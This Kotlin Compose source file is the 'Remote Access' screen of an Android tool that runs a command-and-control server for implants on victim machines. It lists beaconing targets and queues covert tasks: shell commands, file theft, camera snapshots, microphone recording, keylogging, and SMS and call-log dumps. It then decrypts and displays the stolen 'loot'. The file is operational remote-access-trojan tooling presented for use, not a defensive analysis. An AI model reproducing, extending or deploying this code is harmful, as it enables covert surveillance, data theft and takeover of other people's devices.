package com.projectzerodays.quantumcli.ui

import android.graphics.BitmapFactory
import android.util.Base64
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.outlined.PlayArrow
import androidx.compose.material.icons.outlined.SettingsRemote
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Icon
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.unit.dp
import com.projectzerodays.quantumcli.c2.C2State
import com.projectzerodays.quantumcli.c2.Grayfish
import com.projectzerodays.quantumcli.c2.LootEntry
import com.projectzerodays.quantumcli.c2.QuantServerManager
import com.projectzerodays.quantumcli.ops.Net
import com.projectzerodays.quantumcli.ops.RatControl
import com.projectzerodays.quantumcli.ui.theme.Cyan
import com.projectzerodays.quantumcli.ui.theme.Danger
import com.projectzerodays.quantumcli.ui.theme.Muted
import com.projectzerodays.quantumcli.ui.theme.Ok
import com.projectzerodays.quantumcli.ui.theme.QCard
import com.projectzerodays.quantumcli.ui.theme.QuantumTypography
import com.projectzerodays.quantumcli.ui.theme.SoftCyan
import com.projectzerodays.quantumcli.ui.theme.Softest
import com.projectzerodays.quantumcli.ui.theme.Warn
import com.projectzerodays.quantumcli.ui.theme.quantumPanel
import java.io.File

/**
 * Remote Access — fleet console for implants beaconing to the on-device C2.
 *
 * Fleet rows come from live heartbeats (C2State.implants); capability tasks
 * are queued with C2State.setTask and pulled by agents on their next
 * beacon; results return through the /r data channel into per-host loot.
 * Every state has an honest empty variant — no agents, no data, no fakes.
 */
@Composable
fun RatPage() {
    val running by QuantServerManager.running.collectAsState()
    val implants by C2State.implants.collectAsState()
    val tasks by C2State.tasks.collectAsState()
    val loot by C2State.loot.collectAsState()

    var selected by remember { mutableStateOf<String?>(null) }
    var capability by remember { mutableStateOf("sysinfo") }
    var arg by remember { mutableStateOf("") }
    var status by remember { mutableStateOf<String?>(null) }

    var viewEntry by remember { mutableStateOf<LootEntry?>(null) }
    var viewText by remember { mutableStateOf<String?>(null) }
    var viewBitmap by remember { mutableStateOf<android.graphics.Bitmap?>(null) }
    var viewError by remember { mutableStateOf<String?>(null) }

    val c2Base = remember(running) {
        "http://${Net.localIp()}:${QuantServerManager.boundPort}"
    }

    fun dispatch() {
        val host = selected
        if (host.isNullOrBlank()) {
            status = "select a target first"
            return
        }
        try {
            val task = RatControl.buildTask(host, capability, arg, c2Base)
            C2State.setTask(host, task)
            val req = RatControl.describe(capability)?.requires ?: "?"
            status = "queued $capability → $host (needs: $req; runs on next beacon)"
            C2State.audit("RAT", "dispatch $capability -> $host")
        } catch (e: IllegalArgumentException) {
            status = "not queued: ${e.message}"
        }
    }

    fun openLoot(entry: LootEntry) {
        viewEntry = entry
        viewText = null
        viewBitmap = null
        viewError = null
        try {
            val raw = Grayfish.unsealToBytes(File(entry.sealedPath))
            if (raw == null) {
                viewError = "could not unseal ${entry.fileName}"
                return
            }
            // data-channel payloads arrive base64-wrapped; unwrap when valid
            val payload = try {
                val text = raw.toString(Charsets.UTF_8).trim()
                if (text.isNotEmpty() && text.matches(Regex("[A-Za-z0-9+/=\\r\\n]+"))) {
                    Base64.decode(text, Base64.DEFAULT)
                } else {
                    raw
                }
            } catch (e: Exception) {
                raw
            }
            if (payload.size >= 4 &&
                payload[0] == 0x89.toByte() && payload[1] == 0x50.toByte()
            ) {
                // PNG magic — screenshot / camera snapshot
                viewBitmap = BitmapFactory.decodeByteArray(payload, 0, payload.size)
                if (viewBitmap == null) viewError = "image bytes did not decode"
            } else {
                val text = payload.toString(Charsets.UTF_8)
                viewText = text.take(4000)
                // locate payloads get a one-line summary on top
                RatControl.parseLocate(text.trim())?.let { summary ->
                    viewText = summary + "\n\n" + viewText
                }
            }
        } catch (e: Exception) {
            viewError = "open failed: ${e.message}"
        }
    }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Icon(Icons.Outlined.SettingsRemote, null, tint = Cyan)
            Spacer(Modifier.width(8.dp))
            Text("Remote Access", style = QuantumTypography.displaySmall, color = Cyan)
        }
        Spacer(Modifier.height(4.dp))
        Text(
            "Fleet console for implants beaconing to this device. " +
                "Queue a capability — the agent runs it on its next heartbeat " +
                "and the result lands in that host's loot.",
            style = QuantumTypography.bodySmall,
            color = Muted,
        )
        Spacer(Modifier.height(12.dp))

        // ---------------------------------------------------------- C2 switch
        QCard(Modifier.fillMaxWidth(), title = "ON-DEVICE C2") {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(
                    if (running) "LISTENING  $c2Base/r" else "STOPPED",
                    style = QuantumTypography.titleSmall,
                    color = if (running) Ok else Warn,
                    modifier = Modifier.weight(1f),
                )
                if (running) {
                    OutlinedButton(onClick = {
                        QuantServerManager.stop()
                        C2State.audit("RAT", "on-device C2 stopped from Remote Access")
                    }) { Text("STOP") }
                } else {
                    Button(onClick = {
                        val ok = QuantServerManager.start(QuantServerManager.boundPort)
                        if (!ok) status = "C2 failed to bind — see console"
                    }) { Text("START") }
                }
            }
            if (!running) {
                Text(
                    "Start the C2, then point an agent at the URL above " +
                        "(generate one from the CLI: rat_generate_agent).",
                    style = QuantumTypography.labelSmall,
                    color = Muted,
                    modifier = Modifier.padding(top = 4.dp),
                )
            }
        }
        Spacer(Modifier.height(10.dp))

        // --------------------------------------------------------------- fleet
        QCard(Modifier.fillMaxWidth(), title = "FLEET (${implants.size})") {
            if (implants.isEmpty()) {
                Text(
                    if (running) {
                        "No agents beaconing yet — point an agent at $c2Base/r " +
                            "and it appears here on its first heartbeat."
                    } else {
                        "C2 is stopped — nothing can beacon until it is started."
                    },
                    style = QuantumTypography.bodySmall,
                    color = Muted,
                )
            } else {
                val now = System.currentTimeMillis()
                implants.values.sortedBy { it.host }.forEach { info ->
                    val stale = RatControl.isStale(info.lastSeen, now)
                    val pending = tasks.containsKey(info.host)
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Column(Modifier.weight(1f)) {
                            Text(
                                info.host,
                                style = QuantumTypography.titleSmall,
                                color = if (selected == info.host) Cyan else Softest,
                            )
                            Text(
                                "${info.os ?: "os unknown"} · " +
                                    "${info.beacons} beacons · seen ${info.lastSeen}" +
                                    (if (stale) " · STALE" else "") +
                                    (if (pending) " · TASK QUEUED" else ""),
                                style = QuantumTypography.labelSmall,
                                color = when {
                                    pending -> SoftCyan
                                    stale -> Warn
                                    else -> Muted
                                },
                            )
                        }
                        TextButton(onClick = {
                            selected = info.host
                            status = null
                        }) {
                            Text(
                                if (selected == info.host) "TARGET" else "SELECT",
                                color = Cyan,
                            )
                        }
                    }
                }
            }
        }
        Spacer(Modifier.height(10.dp))

        // ---------------------------------------------------------- dispatch
        QCard(Modifier.fillMaxWidth(), title = "DISPATCH") {
            Text(
                "target: ${selected ?: "— none selected —"}",
                style = QuantumTypography.labelMedium,
                color = if (selected == null) Warn else SoftCyan,
            )
            Spacer(Modifier.height(6.dp))
            CapabilityGrid(
                selectedId = capability,
                onSelect = { capability = it; arg = ""; status = null },
            )
            Spacer(Modifier.height(8.dp))
            val hint = when (capability) {
                "shell" -> "raw shell one-liner"
                "ls", "get" -> "remote path (e.g. /sdcard)"
                "snap" -> "camera: 0 rear, 1 front"
                "mic", "keylog" -> "seconds"
                "sms", "calls" -> "limit (1-500)"
                else -> "no argument needed"
            }
            OutlinedTextField(
                value = arg,
                onValueChange = { arg = it },
                modifier = Modifier.fillMaxWidth(),
                singleLine = true,
                enabled = capability in setOf("shell", "ls", "get", "snap", "mic", "sms", "calls", "keylog"),
                placeholder = { Text(hint, style = QuantumTypography.bodySmall) },
            )
            Spacer(Modifier.height(8.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Button(
                    onClick = { dispatch() },
                    enabled = running && selected != null,
                ) {
                    Icon(Icons.Outlined.PlayArrow, null)
                    Spacer(Modifier.width(4.dp))
                    Text("QUEUE TASK")
                }
                Spacer(Modifier.width(8.dp))
                val req = RatControl.describe(capability)?.requires ?: "?"
                Text("needs: $req", style = QuantumTypography.labelMedium, color = Warn)
            }
            status?.let {
                Spacer(Modifier.height(4.dp))
                Text(it, style = QuantumTypography.bodySmall, color = SoftCyan)
            }
            if (!running) {
                Text(
                    "Queueing is disabled while the C2 is stopped.",
                    style = QuantumTypography.labelSmall,
                    color = Muted,
                )
            }
        }
        Spacer(Modifier.height(10.dp))

        // -------------------------------------------------------------- loot
        QCard(Modifier.fillMaxWidth(), title = "RESULTS (LOOT)") {
            val hostLoot = loot.filter { selected == null || it.host == selected }
            if (hostLoot.isEmpty()) {
                Text(
                    if (selected == null) {
                        "No results yet — select a target and queue a capability."
                    } else {
                        "No results from $selected yet — queue a capability and " +
                            "wait for its next beacon."
                    },
                    style = QuantumTypography.bodySmall,
                    color = Muted,
                )
            } else {
                Text(
                    "${hostLoot.size} item(s)" +
                        (if (selected != null) " from $selected" else ""),
                    style = QuantumTypography.labelMedium,
                    color = Muted,
                )
                Spacer(Modifier.height(4.dp))
                LazyColumn(
                    modifier = Modifier
                        .fillMaxWidth()
                        .heightIn(max = 280.dp),
                ) {
                    items(hostLoot.asReversed()) { entry ->
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier
                                .fillMaxWidth()
                                .quantumPanel()
                                .padding(6.dp)
                                .padding(bottom = 4.dp),
                        ) {
                            Column(Modifier.weight(1f)) {
                                Text(
                                    entry.fileName,
                                    style = QuantumTypography.labelMedium,
                                    color = Softest,
                                )
                                Text(
                                    "${entry.host} · ${entry.kind} · " +
                                        "${entry.bytes} B · ${entry.ts}",
                                    style = QuantumTypography.labelSmall,
                                    color = Muted,
                                )
                            }
                            TextButton(onClick = { openLoot(entry) }) {
                                Text("VIEW", color = Cyan)
                            }
                        }
                        Spacer(Modifier.height(4.dp))
                    }
                }
            }
        }
        Spacer(Modifier.height(20.dp))

        // ------------------------------------------------------- result dialog
        if (viewEntry != null) {
            AlertDialog(
                onDismissRequest = {
                    viewEntry = null
                    viewText = null
                    viewBitmap = null
                    viewError = null
                },
                title = {
                    Text(
                        viewEntry!!.fileName,
                        style = QuantumTypography.titleSmall,
                        color = Cyan,
                    )
                },
                text = {
                    when {
                        viewError != null -> Text(viewError!!, color = Danger)
                        viewBitmap != null -> Image(
                            bitmap = viewBitmap!!.asImageBitmap(),
                            contentDescription = "Captured image",
                            modifier = Modifier.fillMaxWidth(),
                        )
                        viewText != null -> Text(
                            viewText!!,
                            style = QuantumTypography.bodySmall,
                            color = Softest,
                        )
                        else -> Text("decoding…", color = Muted)
                    }
                },
                confirmButton = {
                    TextButton(onClick = {
                        viewEntry = null
                        viewText = null
                        viewBitmap = null
                        viewError = null
                    }) { Text("Close") }
                },
            )
        }
    }
}

/** Capability picker: title + requires badge per row. */
@Composable
private fun CapabilityGrid(selectedId: String, onSelect: (String) -> Unit) {
    Column {
        RatControl.CAPABILITIES.forEach { cap ->
            val active = cap.id == selectedId
            Row(verticalAlignment = Alignment.CenterVertically) {
                TextButton(onClick = { onSelect(cap.id) }) {
                    Text(
                        cap.title.uppercase(),
                        color = if (active) Cyan else Softest,
                        style = QuantumTypography.labelMedium,
                    )
                }
                Spacer(Modifier.weight(1f))
                Text(
                    cap.requires,
                    style = QuantumTypography.labelSmall,
                    color = when (cap.requires) {
                        "stock" -> Ok
                        "android-shell" -> SoftCyan
                        "termux-api" -> Warn
                        else -> Danger
                    },
                )
            }
        }
    }
}
